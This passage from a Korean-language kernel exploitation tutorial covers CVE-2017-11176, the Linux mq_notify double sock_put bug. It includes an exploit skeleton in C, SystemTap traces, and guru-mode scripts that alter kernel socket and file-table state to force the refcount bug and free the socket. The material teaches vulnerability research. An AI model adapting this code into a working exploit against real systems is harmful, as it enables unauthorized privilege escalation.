    #define _mq_notify(mqdes, sevp) syscall(__NR_mq_notify, mqdes, sevp)
    #define _socket(domain, type, protocol) syscall(__NR_socket, domain, type, protocol)

    int main(void)
    {
      struct sigevent sigev;
      char sival_buffer[NOTIFY_COOKIE_LEN];
      int sock_fd;

      printf("-={ CVE-2017-11176 Exploit }=-\n");

      if ((sock_fd = _socket(AF_NETLINK, SOCK_DGRAM, NETLINK_GENERIC)) < 0)
      {
        perror("socket");
        goto fail;
      }
      printf("netlink socket created = %d\n", sock_fd);

      // initialize the sigevent structure
      memset(&sigev, 0, sizeof(sigev));
      sigev.sigev_notify = SIGEV_THREAD;
      sigev.sigev_value.sival_ptr = sival_buffer;
      sigev.sigev_signo = sock_fd;  // <--- not '-1' anymore

      if (_mq_notify((mqd_t)-1, &sigev))
      {
        perror("mq_notify");
        goto fail;
      }
      printf("mq_notify succeed\n");

      // TODO: exploit

      return 0;

    fail:
      printf("exploit failed!\n");
      return -1;
    }
```

이제 실행을 해보자:

```plaintext
-={ CVE-2017-11176 Exploit }=-
netlink socket created = 3
mq_notify: Bad file descriptor
exploit failed!

(18998-18998) [SYSCALL] ==>> mq_notify (-1, 0x7ffce9cf2180)
(18998-18998) [uland] ==>> copy_from_user ()
(18998-18998) [skb] ==>> alloc_skb (priority=0xd0 size=0x20)
(18998-18998) [uland] ==>> copy_from_user ()
(18998-18998) [skb] ==>> skb_put (skb=0xffff88003d1e0480 len=0x20)
(18998-18998) [skb] <<== skb_put = ffff88000a0a2800
(18998-18998) [vfs] ==>> fget (fd=0x3)                                          // <--- this time '3' is expected
(18998-18998) [vfs] <<== fget = ffff88003cf14d80                                // PASSED
(18998-18998) [netlink] ==>> netlink_getsockbyfilp (filp=0xffff88003cf14d80)
(18998-18998) [netlink] <<== netlink_getsockbyfilp = ffff88002ff60000           // PASSED
(18998-18998) [netlink] ==>> netlink_attachskb (sk=0xffff88002ff60000 skb=0xffff88003d1e0480 timeo=0xffff88003df8ff40 ssk=0x0)
(18998-18998) [netlink] <<== netlink_attachskb = 0                              // UNWANTED BEHAVIOR
(18998-18998) [vfs] ==>> fget (fd=0xffffffff)
(18998-18998) [vfs] <<== fget = 0
(18998-18998) [netlink] ==>> netlink_detachskb (sk=0xffff88002ff60000 skb=0xffff88003d1e0480)
(18998-18998) [netlink] <<== netlink_detachskb
(18998-18998) [SYSCALL] <<== mq_notify= -9
```

이는 정말 *버그가 많은* 첫 stap trace처럼 보인다. 차이점은 library 뒤에 숨은 것이 아무것도 없고 우리가 *실제로* 모든 데이터(file descriptor, sigev)를 통제한다는 것이다. 첫 **fget()**도 **netlink\_getsockbyflip()**도 *NULL*을 반환하지 않았으므로 우리가 두 검사를 모두 통과한 거라고 안심할 수 있겠다.

### Forcing netlink\_attachskb() to take the retry path

이전 코드를 통해 (0을 반환한) **netlink\_attachskb()**에 도달했다. 이는 우리가 "일반적인" 경로로 들어갔다는 뜻이다. 우리는 일반적인 경로가 아닌 "retry" path로 가고 싶다. 그럼 다시 커널 코드로 돌아가보자:

```c
    int netlink_attachskb(struct sock *sk, struct sk_buff *skb,
              long *timeo, struct sock *ssk)
    {
      struct netlink_sock *nlk;

      nlk = nlk_sk(sk);

[0]   if (atomic_read(&sk->sk_rmem_alloc) > sk->sk_rcvbuf || test_bit(0, &nlk->state)) {
        DECLARE_WAITQUEUE(wait, current);
        if (!*timeo) {
          // ... cut (never reached in our code path) ...
        }

        __set_current_state(TASK_INTERRUPTIBLE);
        add_wait_queue(&nlk->wait, &wait);

        if ((atomic_read(&sk->sk_rmem_alloc) > sk->sk_rcvbuf || test_bit(0, &nlk->state)) &&
            !sock_flag(sk, SOCK_DEAD))
          *timeo = schedule_timeout(*timeo);

        __set_current_state(TASK_RUNNING);
        remove_wait_queue(&nlk->wait, &wait);
        sock_put(sk);

        if (signal_pending(current)) {
          kfree_skb(skb);
          return sock_intr_errno(*timeo);
        }
        return 1;                             // <---- the only way
      }
      skb_set_owner_r(skb, sk);
      return 0;
    }
```

*netlink\_attachskb()* 가 "1"을 반환하게 하는 **유일한 길**로 가기 위해선 먼저 검사를 통과해야 한다 [0].

```c
    if (atomic_read(&sk->sk_rmem_alloc) > sk->sk_rcvbuf || test_bit(0, &nlk->state))
```

이제 System Tap의 *진정한 힘* 을 개방할 때가 됐다. **Guru Mode**를 사용하는 것이다! Guru Mode는 우리가 "C" 코드를 작성하면 그걸 probe에서 호출할 수 있도록 해준다. 마치 Linux Kernel Module (LKM)처럼 런타임에 주입되는(injected) 커널코드를 직접 쓰는 것과 같다. 이때문에 여기서 무슨 프로그래밍 에러가 발생하면 커널 크래시가 발생한다! 이제 커널 개발자가 된 것이다😁.

이제 여기서 우린 *struct sock* (sk) 그리고/혹은 *struct netlink\_sock* (nlk) 데이터 구조를 변형하여 조건을 만족시킬 것이다. 그전에 현재 *struct sock* **sk**의 상태 정보를 얻어보자.

*netlink\_attachskb()* probe를 수정하여 C 코드를 조금 "내장시켜"(embed) 보자("%{" and "%}" 부분).

```c
    %{
    #include <net/sock.h>
    #include <net/netlink_sock.h>
    %}

    function dump_netlink_sock:long (arg_sock:long)
    %{
      struct sock *sk = (void*) STAP_ARG_arg_sock;
      struct netlink_sock *nlk = (void*) sk;

      _stp_printf("-={ dump_netlink_sock: %p }=-\n", nlk);
      _stp_printf("- sk = %p\n", sk);
      _stp_printf("- sk->sk_rmem_alloc = %d\n", sk->sk_rmem_alloc);
      _stp_printf("- sk->sk_rcvbuf = %d\n", sk->sk_rcvbuf);
      _stp_printf("- sk->sk_refcnt = %d\n", sk->sk_refcnt);

      _stp_printf("- nlk->state = %x\n", (nlk->state & 0x1));

      _stp_printf("-={ dump_netlink_sock: END}=-\n");
    %}

    probe kernel.function ("netlink_attachskb")
    {
      if (execname() == "exploit")
      {
        printf("(%d-%d) [netlink] ==>> netlink_attachskb (%s)\n", pid(), tid(), $$parms)

        dump_netlink_sock($sk);
      }
    }
```

**주의**: 다시, 위 코드는 커널 영역에서 실행되므로 에러가 나면 커널 크래시가 발생한다.

system tap을 **-g**(= guru) 옵션을 줘서 실행하자:

```plaintext
-={ CVE-2017-11176 Exploit }=-
netlink socket created = 3
mq_notify: Bad file descriptor
exploit failed!

(19681-19681) [SYSCALL] ==>> mq_notify (-1, 0x7ffebaa7e720)
(19681-19681) [uland] ==>> copy_from_user ()
(19681-19681) [skb] ==>> alloc_skb (priority=0xd0 size=0x20)
(19681-19681) [uland] ==>> copy_from_user ()
(19681-19681) [skb] ==>> skb_put (skb=0xffff88003d1e05c0 len=0x20)
(19681-19681) [skb] <<== skb_put = ffff88000a0a2200
(19681-19681) [vfs] ==>> fget (fd=0x3)
(19681-19681) [vfs] <<== fget = ffff88003d0d5680
(19681-19681) [netlink] ==>> netlink_getsockbyfilp (filp=0xffff88003d0d5680)
(19681-19681) [netlink] <<== netlink_getsockbyfilp = ffff880036256800
(19681-19681) [netlink] ==>> netlink_attachskb (sk=0xffff880036256800 skb=0xffff88003d1e05c0 timeo=0xffff88003df5bf40 ssk=0x0)

-={ dump_netlink_sock: 0xffff880036256800 }=-
- sk = 0xffff880036256800
- sk->sk_rmem_alloc = 0         // <-----
- sk->sk_rcvbuf = 133120        // <-----
- sk->sk_refcnt = 2
- nlk->state = 0                // <-----
-={ dump_netlink_sock: END}=-

(19681-19681) [netlink] <<== netlink_attachskb = 0
(19681-19681) [vfs] ==>> fget (fd=0xffffffff)
(19681-19681) [vfs] <<== fget = 0
(19681-19681) [netlink] ==>> netlink_detachskb (sk=0xffff880036256800 skb=0xffff88003d1e05c0)
(19681-19681) [netlink] <<== netlink_detachskb
(19681-19681) [SYSCALL] <<== mq_notify= -9
```

내장된 stap 함수인 **dump\_netlink\_sock()**이 성공적으로 *netlink\_attachskb()* 에 진입하기 전에 호출되었다. 볼 수 있듯이 *state* 의 첫 비트는 설정되어 있지 않고, *sk\_rmem\_alloc* 이 *sk\_rcvbuf* 보다 작다. 따라서 검사를 통과하지 못한다.

*nlk->state* 를 *netlink\_attachskb()* 호출 전에 수정해보자:

```c
    function dump_netlink_sock:long (arg_sock:long)
    %{
      struct sock *sk = (void*) STAP_ARG_arg_sock;
      struct netlink_sock *nlk = (void*) sk;

      _stp_printf("-={ dump_netlink_sock: %p }=-\n", nlk);
      _stp_printf("- sk = %p\n", sk);
      _stp_printf("- sk->sk_rmem_alloc = %d\n", sk->sk_rmem_alloc);
      _stp_printf("- sk->sk_rcvbuf = %d\n", sk->sk_rcvbuf);
      _stp_printf("- sk->sk_refcnt = %d\n", sk->sk_refcnt);

      _stp_printf("- (before) nlk->state = %x\n", (nlk->state & 0x1));
      nlk->state |= 1;                                                  // <-----
      _stp_printf("- (after) nlk->state = %x\n", (nlk->state & 0x1));

      _stp_printf("-={ dump_netlink_sock: END}=-\n");
    %}
```

그리고 실행해보자:

```plaintext
-={ CVE-2017-11176 Exploit }=-
netlink socket created = 3

<<< HIT CTRL-C HERE >>>

^Cmake: *** [check] Interrupt


(20002-20002) [SYSCALL] ==>> mq_notify (-1, 0x7ffc48bed2c0)
(20002-20002) [uland] ==>> copy_from_user ()
(20002-20002) [skb] ==>> alloc_skb (priority=0xd0 size=0x20)
(20002-20002) [uland] ==>> copy_from_user ()
(20002-20002) [skb] ==>> skb_put (skb=0xffff88003d3a6080 len=0x20)
(20002-20002) [skb] <<== skb_put = ffff88002e142600
(20002-20002) [vfs] ==>> fget (fd=0x3)
(20002-20002) [vfs] <<== fget = ffff88003ddd8380
(20002-20002) [netlink] ==>> netlink_getsockbyfilp (filp=0xffff88003ddd8380)
(20002-20002) [netlink] <<== netlink_getsockbyfilp = ffff88003dde0400
(20002-20002) [netlink] ==>> netlink_attachskb (sk=0xffff88003dde0400 skb=0xffff88003d3a6080 timeo=0xffff88002e233f40 ssk=0x0)

-={ dump_netlink_sock: 0xffff88003dde0400 }=-
- sk = 0xffff88003dde0400
- sk->sk_rmem_alloc = 0
- sk->sk_rcvbuf = 133120
- sk->sk_refcnt = 2
- (before) nlk->state = 0
- (after)  nlk->state = 1
-={ dump_netlink_sock: END}=-

<<< HIT CTRL-C HERE >>>

(20002-20002) [netlink] <<== netlink_attachskb = fffffffffffffe00   // <-----
(20002-20002) [SYSCALL] <<== mq_notify= -512
```

앗...아아... *mq\_notify()* 에 대한 호출이 **막혔다**(= main exploit thread가 syscall 안에서 커널 영역에 갇힘). 다행히 *CTRL-C* 를 누르면 다시 조작할 수 있다.

이번엔 **netlink\_attachskb()**가 **0xfffffffffffffe00**를 반환했다는 점에 주목해보자. 이는 "-ERESTARTSYS"의 에러 번호다. 즉 우리는 이 path로 들어온 것이다:

```c
        if (signal_pending(current)) {
            kfree_skb(skb);
            return sock_intr_errno(*timeo); // <---- return -ERESTARTSYS
        }
```

이는 우리가 *netlink\_attachskb()* 의 다른 path에 도달했음을 의미한다. 임무 성공이다!

### Avoid being blocked

*mq\_notify()* 가 막힌 이유는 이것이다:

```c
        __set_current_state(TASK_INTERRUPTIBLE);

        if ((atomic_read(&sk->sk_rmem_alloc) > sk->sk_rcvbuf || test_bit(0, &nlk->state)) &&
            !sock_flag(sk, SOCK_DEAD))
            *timeo = schedule_timeout(*timeo);

        __set_current_state(TASK_RUNNING);
```

*scheduling* 에 대해서는 나중에 더 자세히 다루도록 하고(part 2 참고), 지금은 우리의 task가 *특수한 조건* 을 만족할 때까지 **멈춰있다**는 것만 고려해보자 (wait queue에 대한 것이다).

schedule되거나 block되는 것을 피할 수 있을까? 그렇게 하기 위해선 **schedule\_timeout()**에 대한 호출을 우회해야 한다. sock을 "SOCK\_DEAD"라고 mark해보자 (조건의 마지막 부분). 즉 (전에 했던 것처럼) "sk"의 내용을 바꿔 다음의 **sock\_flag()** 함수가 true를 반환하도록 하는 것이다:

```c
    // from [include/net/sock.h]
    static inline bool sock_flag(const struct sock *sk, enum sock_flags flag)
    {
      return test_bit(flag, &sk->sk_flags);
    }

    enum sock_flags {
      SOCK_DEAD,      // <---- this has to be '0', but we can check it with stap!
      ... cut ...
    }
```

probe를 다시 수정해보자:

```c
  // mark it congested!
  _stp_printf("- (before) nlk->state = %x\n", (nlk->state & 0x1));
  nlk->state |= 1;            
  _stp_printf("- (after) nlk->state = %x\n", (nlk->state & 0x1));

  // mark it DEAD
  _stp_printf("- sk->sk_flags = %x\n", sk->sk_flags);
  _stp_printf("- SOCK_DEAD = %x\n", SOCK_DEAD);
  sk->sk_flags |= (1 << SOCK_DEAD);
  _stp_printf("- sk->sk_flags = %x\n", sk->sk_flags);
```

다시 실행을 해보면...짜잔! 익스플로잇이 이젠 커널 안에서 무한 루프에 갇혔다. 이유는 다음과 같다:

* *netlink\_attachskb()*에 진입하고 retry path를 사용한다 (우리가 강제했다)
* 스레드가 schedule되지 않는다 (우회했다)
* *netlink\_attachskb()* 가 1을 반환한다
* *mq\_notify()* 로 돌아가서 "goto retry" 구문이 실행된다
* *fget()* 이 null이 아닌 값을 반환한다
* *netlink\_getsockbyflip()*도 null이 아닌 값을 반환한다
* 다시 *netlink\_attachskb()* 에 진입한다
* ...무한 반복...

우릴 block한 *schedule\_timeout()* 으로의 호출은 잘 우회했지만, 그 과정에서 무한 루프가 생겼다.

### Stopping the infinite loop

해킹을 계속 진행하여 *fget()* 이 두 번째 호출에서 실패하게 해보자! FDT에서 file descriptor를 직접적으로 제거하는 것이 한 방법이다(= NULL로 만든다):

```c
    %{
    #include <linux/fdtable.h>
    %}

    function remove_fd3_from_fdt:long (arg_unused:long)
    %{
        _stp_printf("!!>>> REMOVING FD=3 FROM FDT <<<!!\n");
        struct files_struct *files = current->files;
        struct fdtable *fdt = files_fdtable(files);
        fdt->fd[3] = NULL;
    %}

    probe kernel.function ("netlink_attachskb")
    {
      if (execname() == "exploit")
      {
        printf("(%d-%d) [netlink] ==>> netlink_attachskb (%s)\n", pid(), tid(), $$parms)

        dump_netlink_sock($sk); // it also marks the socket as DEAD and CONGESTED
        remove_fd3_from_fdt(0);
      }
    }
```

```plaintext
-={ CVE-2017-11176 Exploit }=-
netlink socket created = 3
mq_notify: Bad file descriptor
exploit failed!

(3095-3095) [SYSCALL] ==>> mq_notify (-1, 0x7ffe5e528760)
(3095-3095) [uland] ==>> copy_from_user ()
(3095-3095) [skb] ==>> alloc_skb (priority=0xd0 size=0x20)
(3095-3095) [uland] ==>> copy_from_user ()
(3095-3095) [skb] ==>> skb_put (skb=0xffff88003f02cd00 len=0x20)
(3095-3095) [skb] <<== skb_put = ffff88003144ac00
(3095-3095) [vfs] ==>> fget (fd=0x3)
(3095-3095) [vfs] <<== fget = ffff880031475480
(3095-3095) [netlink] ==>> netlink_getsockbyfilp (filp=0xffff880031475480)
(3095-3095) [netlink] <<== netlink_getsockbyfilp = ffff88003cf56800
(3095-3095) [netlink] ==>> netlink_attachskb (sk=0xffff88003cf56800 skb=0xffff88003f02cd00 timeo=0xffff88002d79ff40 ssk=0x0)
-={ dump_netlink_sock: 0xffff88003cf56800 }=-
- sk = 0xffff88003cf56800
- sk->sk_rmem_alloc = 0
- sk->sk_rcvbuf = 133120
- sk->sk_refcnt = 2
- (before) nlk->state = 0
- (after) nlk->state = 1
- sk->sk_flags = 100
- SOCK_DEAD = 0
- sk->sk_flags = 101
-={ dump_netlink_sock: END}=-
!!>>> REMOVING FD=3 FROM FDT <<<!!
(3095-3095) [netlink] <<== netlink_attachskb = 1        // <-----
(3095-3095) [vfs] ==>> fget (fd=0x3)
(3095-3095) [vfs] <<== fget = 0                         // <-----
(3095-3095) [netlink] ==>> netlink_detachskb (sk=0xffff88003cf56800 skb=0xffff88003f02cd00)
(3095-3095) [netlink] <<== netlink_detachskb
(3095-3095) [SYSCALL] <<== mq_notify= -9
```

우리가 소개한 대로 커널이 무한루프를 잘 탈출했다. 게다가 공격 시나리오에 점점 가까워지고 있다:

1. *netlink\_attachskb()*가 1을 반환
2. *fget()*에 대한 두 번째 호출이 NULL을 반환

그럼 우리가 버그를 트리거한 것인가?

### Checking the refcounter status

모든 것이 계획대로 됐으므로 버그가 트리거되고 *sock* 레퍼런스 카운터가 두 번 감소해야 한다. 체크해보자.

*exit probe*에서 *enter probe*의 파라미터를 가져올 순 없다. 이는 *netlink\_attachskb()*에서 리턴하는 도중에 *sock*의 내용을 볼 수 없다는 뜻이다.

한 방법은 *netlink\_getsockbyflip()* 이 반환하는 *sock* 포인터를 전역 변수(스크립트의 *sock\_ptr*)로 저장하는 것이다. 그리고 내장 "C" 코드의 *dump\_netlink\_sock()* 으로 내용을 덤프하는 것이다:

```c
    global sock_ptr = 0;                  // <------ declared globally!

    probe syscall.mq_notify.return
    {
      if (execname() == "exploit")
      {
        if (sock_ptr != 0)                // <----- watch your NULL-deref, this is kernel-land!
        {
          dump_netlink_sock(sock_ptr);
          sock_ptr = 0;
        }

        printf("(%d-%d) [SYSCALL] <<== mq_notify= %d\n\n", pid(), tid(), $return)
      }
    }

    probe kernel.function ("netlink_getsockbyfilp").return
    {
      if (execname() == "exploit")
      {
        printf("(%d-%d) [netlink] <<== netlink_getsockbyfilp = %x\n", pid(), tid(), $return)
        sock_ptr = $return;                 // <----- store it
      }
    }
```

다시 실행해보자!

```plaintext
(3391-3391) [SYSCALL] ==>> mq_notify (-1, 0x7ffe8f78c840)
(3391-3391) [uland] ==>> copy_from_user ()
(3391-3391) [skb] ==>> alloc_skb (priority=0xd0 size=0x20)
(3391-3391) [uland] ==>> copy_from_user ()
(3391-3391) [skb] ==>> skb_put (skb=0xffff88003d20cd00 len=0x20)
(3391-3391) [skb] <<== skb_put = ffff88003df9dc00
(3391-3391) [vfs] ==>> fget (fd=0x3)
(3391-3391) [vfs] <<== fget = ffff88003d84ed80
(3391-3391) [netlink] ==>> netlink_getsockbyfilp (filp=0xffff88003d84ed80)
(3391-3391) [netlink] <<== netlink_getsockbyfilp = ffff88002d72d800
(3391-3391) [netlink] ==>> netlink_attachskb (sk=0xffff88002d72d800 skb=0xffff88003d20cd00 timeo=0xffff8800317a7f40 ssk=0x0)
-={ dump_netlink_sock: 0xffff88002d72d800 }=-
- sk = 0xffff88002d72d800
- sk->sk_rmem_alloc = 0
- sk->sk_rcvbuf = 133120
- sk->sk_refcnt = 2               // <------------
- (before) nlk->state = 0
- (after) nlk->state = 1
- sk->sk_flags = 100
- SOCK_DEAD = 0
- sk->sk_flags = 101
-={ dump_netlink_sock: END}=-
!!>>> REMOVING FD=3 FROM FDT <<<!!
(3391-3391) [netlink] <<== netlink_attachskb = 1
(3391-3391) [vfs] ==>> fget (fd=0x3)
(3391-3391) [vfs] <<== fget = 0
(3391-3391) [netlink] ==>> netlink_detachskb (sk=0xffff88002d72d800 skb=0xffff88003d20cd00)
(3391-3391) [netlink] <<== netlink_detachskb
-={ dump_netlink_sock: 0xffff88002d72d800 }=-
- sk = 0xffff88002d72d800
- sk->sk_rmem_alloc = 0
- sk->sk_rcvbuf = 133120
- sk->sk_refcnt = 0               // <-------------
- (before) nlk->state = 1
- (after) nlk->state = 1
- sk->sk_flags = 101
- SOCK_DEAD = 0
- sk->sk_flags = 101
-={ dump_netlink_sock: END}=-
(3391-3391) [SYSCALL] <<== mq_notify= -9
```

볼 수 있듯이 *sk->sk\_refcnt*가 두 번 감소했다! 성공적으로 버그를 트리거했다.

*sock* 의 레퍼런스 카운터가 0이 되는 것은 *struct netlink\_sock* 오브젝트가 free됨을 의미한다. 다른 probe를 더 추가해보자:

```plaintext
... cut ...

(13560-13560) [netlink] <<== netlink_attachskb = 1
(13560-13560) [vfs] ==>> fget (fd=0x3)
(13560-13560) [vfs] <<== fget = 0
(13560-13560) [netlink] ==>> netlink_detachskb (sk=0xffff88002d7e5c00 skb=0xffff88003d2c1440)
(13560-13560) [kmem] ==>> kfree (objp=0xffff880033fd0000)
(13560-13560) [kmem] <<== kfree = 
(13560-13560) [sk] ==>> sk_free (sk=0xffff88002d7e5c00)
(13560-13560) [sk] ==>> __sk_free (sk=0xffff88002d7e5c00)
(13560-13560) [kmem] ==>> kfree (objp=0xffff88002d7e5c00) // <---- freeing "sock"
(13560-13560) [kmem] <<== kfree = 
(13560-13560) [sk] <<== __sk_free = 
(13560-13560) [sk] <<== sk_free = 
(13560-13560) [netlink] <<== netlink_detachskb
```

sock 오브젝트가 free되긴 하는데 *use-after-free*가 보이진 않는다...

### Why it did not crash?

원래 계획과는 다르게 *netlink\_sock* 오브젝트가 *netlink\_detachskb()*에 의해 free되었다.이유는 ***close()* 를 호출하지 않았기** 때문이다(FDT 항목만 NULL로 리셋해주었다). 즉 file 오브젝트가 release되지 않았고, *netlink\_sock* 오브젝트에 대한 참조를 해제하지 않은 것이다. 다시 말해 레퍼런스 카운터가 감소하지 않았다.

그러나 우리의 목적은 레퍼런스 카운터가 두 번(*netlink\_attachskb()* 에 의해서 한 번, *netlink\_detachskb()* 에 의해서 한 번) 감소한다는 것을 검증하는 것이었기 때문에 별 문제가 되진 않는다. 일반적인 흐름대로 operation(= *close()*)이 진행된다면 이 추가적인 레퍼런스 카운터의 감소가 발생하여 *netlink\_detachskb()*가 UAF를 할 것이다. 우린 심지어 상황을 더 잘 제어하기 위해 이 use-after-free를 "delay"할 것이다(part 2 참고).

### The final System Tap script

마지막으로, 버그를 트리거하는 system tap 스크립트는 다음과 같이 간단해진다:

```c
# mq_notify_force_crash.stp
#
# Run it with "stap -v -g ./mq_notify_force_crash.stp" (guru mode)

%{
#include <net/sock.h>
#include <net/netlink_sock.h>
#include <linux/fdtable.h>
%}

function force_trigger:long (arg_sock:long)
%{
  struct sock *sk = (void*) STAP_ARG_arg_sock;
  sk->sk_flags |= (1 << SOCK_DEAD); // avoid blocking the thread

  struct netlink_sock *nlk = (void*) sk;
  nlk->state |= 1;   // enter the netlink_attachskb() retry path    

  struct files_struct *files = current->files;
  struct fdtable *fdt = files_fdtable(files);
  fdt->fd[3] = NULL; // makes the second call to fget() fails
%}

probe kernel.function ("netlink_attachskb")
{
  if (execname() == "exploit")
  {
    force_trigger($sk);
  }
}
```

참 쉽죠?

- - -

## <a name='conclusion'></a>결론

이번 첫 번째 파트에선 리눅스 커널 초심자를 위해 핵심 커널 데이터 구조와 레퍼런스 카운팅 facility를 소개했다. 공개되어 있는 정보(CVE description, 패치)를 보며 버그에 대해 더 잘 이해하게 되고 공격 시나리오도 작성했다.

그리고 익스플로잇 개발을 시작하여 권한이 없는(unprivileged) 사용자로부터 버그에 실제로 도달할 수 있다는 것을 검증했다. 그 과정에서 훌륭한 커널 도구 System Tap을 소개했다. 또한 첫 난관(library wrappers)를 마주했고 이를 감지하는 법을 보았다.

System Tap의 Guru Mode를 이용하여 커널 영역에서 트리거가 되도록 만들고 이중 *sock\_put()* 버그를 확실히 만들어낼 수 있음을 검증했다. 버그를 트리거하기 위해선 세 가지가 필요했다:

1. *netlink\_attachskb()*가 1을 반환하게 만들기
2. 익스플로잇 스레드 unblock하기
3. 두 번째 *fget()* 호출이 NULL을 반환하게 만들기

다음 파트에선 System Tap을 통해 커널을 수정했던 부분을 하나 하나 대체할 것이다. 유저 영역의 코드만으로 버그를 트리거하는 proof-of-concept 코드를 점진적으로 만드는 것이다.

커널 영역 익스플로잇 여정을 즐겼길 바란다. 이제 [part 2](https://chamalane.herokuapp.com/posts/5d5035f8c040080004228196)에서 보자!
